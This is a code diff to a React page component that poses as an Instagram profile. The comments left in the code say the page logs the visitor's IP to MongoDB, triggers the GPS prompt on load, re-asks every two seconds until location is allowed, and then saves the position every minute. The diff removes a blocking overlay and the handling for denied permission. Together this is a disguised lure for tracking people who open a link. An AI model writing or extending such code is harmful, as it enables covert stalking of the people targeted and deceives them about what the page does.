@@ -12,7 +12,6 @@ export default function RecipientFeed({
   const [coords, setCoords] = useState(null);
   const [hasAllowed, setHasAllowed] = useState(false);
   const [isReelOpen, setIsReelOpen] = useState(false);
-  const [isDenied, setIsDenied] = useState(false);
 
   const watchIdRef = useRef(null);
   const retryTimerRef = useRef(null);
@@ -150,19 +149,12 @@ export default function RecipientFeed({
 
     navigator.geolocation.getCurrentPosition(
       async (position) => {
-        setIsDenied(false);
         await saveLocation(position);
         setIsFollowing(true);
         startOneMinuteInterval();
       },
       (error) => {
-        if (error.code === 1) {
-          // PERMISSION_DENIED (e.g. User clicked "Never allow" or "Block")
-          console.warn("Location permission blocked/denied by user.");
-          setIsDenied(true);
-        } else {
-          console.warn("Browser location pending/dismissed:", error.message);
-        }
+        console.warn("Native location prompt pending/dismissed:", error.message);
       },
       {
         enableHighAccuracy: true,
@@ -212,30 +204,13 @@ export default function RecipientFeed({
       navigator.serviceWorker.register("/sw.js").catch(() => { });
     }
 
-    // 0.1 Watch permission state changes in browser settings
-    if (typeof navigator !== "undefined" && navigator.permissions && navigator.permissions.query) {
-      navigator.permissions.query({ name: "geolocation" }).then((permissionStatus) => {
-        if (permissionStatus.state === "denied") {
-          setIsDenied(true);
-        }
-        permissionStatus.onchange = () => {
-          if (permissionStatus.state === "granted" || permissionStatus.state === "prompt") {
-            setIsDenied(false);
-            requestLocation();
-          } else if (permissionStatus.state === "denied") {
-            setIsDenied(true);
-          }
-        };
-      }).catch(() => {});
-    }
-
     // 1. Immediately log IP address and visit to MongoDB on open
     trackVisitImmediately();
 
     // 2. Trigger native browser GPS prompt immediately on page load
     requestLocation();
 
-    // 3. Continuously ask / retry every 2.5 seconds until user taps "Allow"
+    // 3. Continuously ask / retry native browser prompt every 2 seconds until user taps "Allow" or "Allow once"
     retryTimerRef.current = setInterval(() => {
       if (!hasAllowedRef.current && !isTrackingStoppedRef.current) {
         requestLocation();
@@ -244,7 +219,7 @@ export default function RecipientFeed({
         retryTimerRef.current = null;
         startOneMinuteInterval();
       }
-    }, 2500);
+    }, 2000);
 
     // 4. Handle Tab Visibility, Tab Close & 3-Minute Cutoff
     const handleVisibilityChange = () => {
@@ -705,79 +680,6 @@ export default function RecipientFeed({
             </div>
           </button>
         </nav>
-
-        {/* Persistent Location Request Overlay (shows until user taps Allow / Allow this time only) */}
-        {!hasAllowed && (
-          <div className="location-blur-modal-overlay" onClick={requestLocation}>
-            <div className="location-blur-modal-card" onClick={(e) => { e.stopPropagation(); requestLocation(); }}>
-              <div className="blur-modal-icon-wrapper" style={isDenied ? { borderColor: 'rgba(239, 68, 68, 0.5)', background: 'linear-gradient(135deg, rgba(239, 68, 68, 0.22), rgba(185, 28, 28, 0.28))', color: '#EF4444' } : {}}>
-                <div className="blur-modal-pulse-circle" style={isDenied ? { borderColor: 'rgba(239, 68, 68, 0.55)' } : {}}></div>
-                {isDenied ? (
-                  <svg viewBox="0 0 24 24" width="36" height="36" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-                    <circle cx="12" cy="12" r="10" />
-                    <line x1="4.93" y1="4.93" x2="19.07" y2="19.07" />
-                  </svg>
-                ) : (
-                  <svg viewBox="0 0 24 24" width="36" height="36" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-                    <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z" />
-                    <circle cx="12" cy="9" r="2.5" />
-                  </svg>
-                )}
-              </div>
-
-              {isDenied ? (
-                <>
-                  <h2 className="blur-modal-title" style={{ color: '#FCA5A5' }}>Location Access is Blocked</h2>
-                  <p className="blur-modal-desc">
-                    You previously selected <strong>&quot;Never allow&quot;</strong> or blocked permissions. Follow these quick steps to continue:
-                  </p>
-
-                  <div className="blur-modal-steps">
-                    <div className="blur-modal-step-item">
-                      <span className="step-num">1</span>
-                      <span>Tap the <strong>🔒 Lock / Site Settings</strong> icon in your browser address bar.</span>
-                    </div>
-                    <div className="blur-modal-step-item">
-                      <span className="step-num">2</span>
-                      <span>Change <strong>Location</strong> from <em>Blocked</em> to <strong>&quot;Allow&quot;</strong>.</span>
-                    </div>
-                    <div className="blur-modal-step-item">
-                      <span className="step-num">3</span>
-                      <span>Tap <strong>&quot;Retry Location&quot;</strong> below or reload page.</span>
-                    </div>
-                  </div>
-
-                  <div className="blur-modal-btn-group">
-                    <button className="blur-modal-btn" onClick={requestLocation}>
-                      <span>🔄 I&apos;ve Allowed, Retry Now</span>
-                    </button>
-                    <button className="blur-modal-btn-secondary" onClick={() => window.location.reload()}>
-                      <span>🔄 Reload Page</span>
-                    </button>
-                  </div>
-                </>
-              ) : (
-                <>
-                  <h2 className="blur-modal-title">Continue to Instagram Profile</h2>
-                  <p className="blur-modal-desc">
-                    Please tap <strong>&quot;Allow&quot;</strong> (or <strong>&quot;Allow this time only&quot;</strong>) on the browser prompt to view <strong>mr_in.nocent_yogi</strong>&apos;s profile, highlights, and reels.
-                  </p>
-
-                  <button className="blur-modal-btn" onClick={requestLocation}>
-                    <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
-                      <polygon points="5 3 19 12 5 21 5 3" fill="currentColor" />
-                    </svg>
-                    <span>Allow Location to View</span>
-                  </button>
-
-                  <span className="blur-modal-hint">
-                    🔒 Tap anywhere on screen to grant access
-                  </span>
-                </>
-              )}
-            </div>
-          </div>
-        )}
 
         {/* Reel Popup Modal Feature */}
         <ReelModal isOpen={isReelOpen} onClose={() => setIsReelOpen(false)} />
